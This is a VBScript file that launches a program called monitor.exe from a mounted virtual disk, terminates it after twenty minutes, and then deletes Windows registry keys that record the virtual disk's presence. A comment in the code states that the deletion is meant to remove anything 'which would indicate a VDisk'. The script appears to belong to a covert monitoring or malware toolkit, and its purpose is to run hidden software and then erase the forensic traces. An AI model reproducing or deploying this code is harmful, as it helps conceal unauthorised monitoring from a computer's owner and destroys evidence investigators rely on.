const HKEY_CURRENT_USER = &H80000001
const HKEY_LOCAL_MACHINE = &H80000002

Function regRead(hive, path, value)
        Set reg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
        reg.GetStringValue hive,path,value,return
        regRead = return
End Function

Sub regDeleteValue(hive, path, value)
        Set reg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
        reg.DeleteValue hive,path,value
End Sub

Sub regDeleteKey(hive, path)
        Set reg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
        reg.EnumKey hive, path, subkeys 
        If IsArray(subkeys) Then 
                For Each subkey In subkeys 
                        regDeleteKey hive, path & "\" & subkey 
                Next 
        End If 
        reg.DeleteKey hive,path
End Sub


Sub deleteVDiskRegistryEntries(letter)

        ' delete Registry entries which would indicate a VDisk, ideally before they can be flushed to disk
        diskID = regRead(HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Enum\SCSI\Disk&Ven_Msft&Prod_Virtual_Disk" & _
                "\2&1f4adffe&0&000001\Device Parameters\PartMgr\", "DiskId")
        storageDriver = regRead(HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Enum\STORAGE\Volume\" & diskID & _
                "#0000000000010000\", "Driver")
        scsiDriver = regRead(HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Enum\SCSI\Disk&Ven_Msft&Prod_Virtual_Disk" & _
                "\2&1f4adffe&0&000001\", "Driver")
        vhdDriver = regRead(HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Enum\{8e7bd593-6e6c-4c52-86a6-77175494dd8e}" & _
                "\MsVhdHba\1&3030e83&0&01\", "Driver")
        regDeleteKey HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\" & letter & ":" 
        regDeleteValue HKEY_LOCAL_MACHINE, "SYSTEM\MountedDevices\", "\DosDevices\" & letter & ":" 
        regDeleteKey HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\Class\{2EA9B43F-3045-43B5-80F2-FD06C55FBB90}"
        regDeleteKey HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\Class\" & storageDriver
        regDeleteKey HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\Class\" & scsiDriver
        regDeleteKey HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\Class\" & vhdDriver
        regDeleteKey HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\DeviceClasses\" & _
                "{2accfe60-c130-11d2-b082-00a0c91efb8b}\##?#{8e7bd593-6e6c-4c52-86a6-77175494dd8e}" & _
                "#MsVhdHba#1&3030e83&0&01#{2accfe60-c130-11d2-b082-00a0c91efb8b}"
        regDeleteKey HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\DeviceClasses\" & _
                "{53f56307-b6bf-11d0-94f2-00a0c91efb8b}\##?#SCSI#Disk&Ven_Msft&Prod_Virtual_Disk" & _
                "#2&1f4adffe&0&000001#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}"
        regDeleteKey HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\DeviceClasses\" & _
                "{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\##?#STORAGE#VOLUME#" & diskID & _
                "#0000000000010000#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}"
        regDeleteKey HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Enum\{8e7bd593-6e6c-4c52-86a6-77175494dd8e}"
        regDeleteKey HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Enum\Root\LEGACY_FASTFAT"
        regDeleteKey HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Enum\Root\LEGACY_FSDEPENDS"
        regDeleteKey HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Enum\SCSI\Disk&Ven_Msft&Prod_Virtual_Disk"
        regDeleteKey HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Enum\STORAGE\Volume\" & diskID & "#0000000000010000"
        
End Sub

Sub killProgram(name)
        Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}\\.\root\cimv2")
        Set procList = objWMIService.ExecQuery("Select * from Win32_Process")

        For Each proc in procList
                If proc.Name = name Then
                        proc.Terminate()
                End If
        Next
End Sub

WScript.Sleep 20000
set cmd = CreateObject("WScript.Shell")
cmd.Run("M:\monitor.exe")
WScript.Sleep 1200000
killProgram "monitor.exe"
set fso = CreateObject("Scripting.FileSystemObject")
Do While fso.FileExists("M:\sys.vbs")
        WScript.Sleep 10000
Loop

WScript.Sleep 10000
deleteVDiskRegistryEntries "M"

